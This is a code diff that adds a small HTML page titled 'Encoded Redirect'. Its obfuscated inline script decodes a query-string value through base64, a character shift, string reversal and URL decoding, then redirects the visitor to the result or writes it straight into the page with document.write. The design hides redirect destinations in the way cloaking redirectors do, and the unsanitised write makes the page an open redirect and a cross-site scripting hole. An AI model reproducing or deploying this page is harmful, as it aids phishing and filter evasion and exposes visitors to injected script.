@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Encoded Redirect</title>
+</head>
+<body>
+    <script>
+        !function() {
+            function e(e) {
+                return decodeURIComponent(Array.prototype.map.call(atob(e), function(e) {
+                    return "%" + ("00" + e.charCodeAt(0).toString(16)).slice(-2);
+                }).join(""));
+            }
+            function n(e) {
+                return String.fromCharCode(...e.split("").map(e => e.charCodeAt(0) - 1));
+            }
+            function t(e) {
+                return e.split("").reverse().join("");
+            }
+            function o(e) {
+                try {
+                    return new URL(e), !0;
+                } catch {
+                    return !1;
+                }
+            }
+            var r = window.location.search.substring(1);
+            if (r) {
+                var c = r.split("=")[1]
+                  , i = e(c)
+                  , l = n(i)
+                  , a = t(l)
+                  , u = decodeURIComponent(a);
+                o(u) ? window.location.replace(u) : document.write(u);
+            } else {
+                window.location.replace(atob(""));
+            }
+        }();
+    </script>
+</body>
+</html>
